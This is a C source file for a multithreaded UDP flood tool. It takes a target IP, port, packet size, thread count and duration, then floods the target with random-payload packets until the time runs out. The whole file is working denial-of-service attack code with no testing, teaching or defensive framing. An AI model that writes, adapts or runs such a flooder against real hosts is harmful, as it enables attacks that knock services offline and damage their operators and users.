#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 1400

char payload[MAX_PACKET_SIZE];
int floodport, packet_size;
volatile int running = 1;

void fill_payload() {
    for (int i = 0; i < MAX_PACKET_SIZE; i++) {
        payload[i] = rand() % 256;
    }
}

void *flood_thread(void *arg) {
    char *target_ip = (char *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(floodport);
    target.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    char buffer[MAX_PACKET_SIZE];

    while (running) {
        // Copy payload to buffer for each packet (optional randomization)
        memcpy(buffer, payload, packet_size);
        sendto(sock, buffer, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <target IP> <port> <packet size> <threads> <duration seconds>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    char *target_ip = argv[1];
    floodport = atoi(argv[2]);
    packet_size = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int duration = atoi(argv[5]);

    if (packet_size > MAX_PACKET_SIZE || packet_size < 1) {
        printf("Packet size must be between 1 and %d\n", MAX_PACKET_SIZE);
        return 1;
    }

    fill_payload();

    pthread_t thread_id[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_id[i], NULL, flood_thread, (void *)target_ip);
    }

    sleep(duration);
    running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("Flood finished.\n");
    return 0;
}
